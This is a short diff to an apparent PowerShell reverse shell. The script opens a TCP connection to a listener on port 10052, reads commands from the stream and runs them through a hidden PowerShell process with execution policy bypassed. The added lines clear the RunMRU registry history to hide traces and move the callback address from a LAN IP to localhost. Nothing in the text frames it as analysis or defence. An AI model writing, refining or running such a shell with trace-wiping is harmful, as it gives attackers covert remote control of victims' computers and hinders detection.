@@ -1,4 +1,5 @@
-$client = New-Object System.Net.Sockets.TCPClient('192.168.1.191', 10052)
+Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z -ErrorAction SilentlyContinue
+$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1', 10052)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
   Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $data" -windowstyle hidden -Wait -NoNewWindow
